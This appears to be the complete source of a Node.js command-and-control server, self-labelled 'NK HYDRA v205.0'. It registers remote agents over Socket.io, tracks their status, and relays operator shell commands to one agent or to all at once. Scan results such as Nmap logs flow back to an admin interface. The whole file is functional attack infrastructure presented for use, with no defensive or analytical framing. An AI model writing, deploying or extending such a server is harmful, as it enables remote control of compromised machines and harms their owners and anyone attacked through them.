// TYPE: NODE.JS C2 SERVER
// NK HYDRA v205.0 [CRASH PROTECTION & MOBILE WAKE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { 
    res.json({ status: 'online', version: 'v205.0', agents: agents.length }); 
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 15000, 
    pingTimeout: 30000, 
    maxHttpBufferSize: 1e8, // 100MB Buffer for Nmap Logs
    transports: ['polling', 'websocket'] 
});

let agents = []; 
const commandQueue = [];
const eventHistory = []; 
const MAX_HISTORY = 50; // Reduced history size to save RAM on free tier

const broadcastLog = (type, payload) => {
    try {
        const event = { type, payload, timestamp: Date.now() };
        
        // TRUNCATE PAYLOAD FOR HISTORY (Prevents Memory Crash)
        const histEvent = { ...event };
        if (typeof histEvent.payload === 'string' && histEvent.payload.length > 5000) {
            histEvent.payload = histEvent.payload.substring(0, 5000) + '... [TRUNCATED FOR MEMORY]';
        }
        
        eventHistory.push(histEvent);
        if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
        
        // Emit full event to connected UIs
        io.to('ui_room').emit('agent_event', event);
    } catch (e) {
        console.error("Broadcast Error:", e);
    }
};

let isProcessingQueue = false;
const processQueue = async () => {
    if (isProcessingQueue) return;
    isProcessingQueue = true;

    try {
        while (commandQueue.length > 0) {
            const task = commandQueue.shift();
            if (task) {
                try {
                    if (task.targetId === 'all') {
                        io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                        broadcastLog('INFO', { source: 'C2', message: 'Broadcast Sent', cmd: task.cmd });
                    } else {
                        const agent = agents.find(a => a.id === task.targetId);
                        if (agent && agent.socketId) {
                             // SAFE EMIT
                             io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                             broadcastLog('INFO', { source: 'C2', message: `Dispatched to ${agent.id}`, cmd: task.cmd });
                        } else {
                            broadcastLog('WARNING', { source: 'C2', message: 'Agent Offline for Task', target: task.targetId });
                        }
                    }
                } catch (cmdError) {
                    console.error("Cmd Execution Error:", cmdError);
                    broadcastLog('ERROR', { source: 'C2', message: 'Queue Dispatch Error', details: cmdError.message });
                }
            }
            await new Promise(r => setTimeout(r, 100)); 
        }
    } catch (qError) {
        console.error("Queue Fatal Error:", qError);
    } finally {
        isProcessingQueue = false;
    }
};

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        try {
            if (data.type === 'ui') {
                socket.join('ui_room');
                socket.emit('agents_list', agents);
                socket.emit('history_dump', eventHistory); 
                broadcastLog('SUCCESS', { source: 'C2_SYS', message: 'UI Admin Connected' });
                return;
            }
            
            // Agent Logic
            agents = agents.filter(a => a.id !== data.id);
            agents.push({ ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() });
            
            io.to('ui_room').emit('agents_list', agents);
            broadcastLog('SUCCESS', { source: 'C2_SYS', message: `Agent Reconnected: ${data.id}` });
            
            if(commandQueue.length > 0) processQueue();
        } catch (e) { console.error("Identify Error", e); }
    });

    socket.on('exec_cmd', (data) => {
        commandQueue.push({ ...data, id: Date.now().toString() });
        processQueue();
    });
    
    socket.on('agent_event', (data) => {
        try {
            const event = { 
                type: data.type, 
                agentId: data.agentId || 'UNKNOWN',
                payload: data.payload,
                timestamp: Date.now()
            };
            
            // Log rotation logic same as broadcast
            const histEvent = { ...event };
            if (typeof histEvent.payload === 'string' && histEvent.payload.length > 5000) {
                histEvent.payload = histEvent.payload.substring(0, 5000) + '... [TRUNCATED]';
            }

            eventHistory.push(histEvent);
            if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
            
            io.to('ui_room').emit('agent_event', event);
        } catch (e) { console.error("Event Relay Error", e); }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
            broadcastLog('WARNING', { source: 'C2_SYS', message: `Agent Dropped: ${agent.id}` });
        }
    });
    
    socket.on('heartbeat', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) agent.lastSeen = Date.now();
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v205 LISTENING ON ${PORT}`));

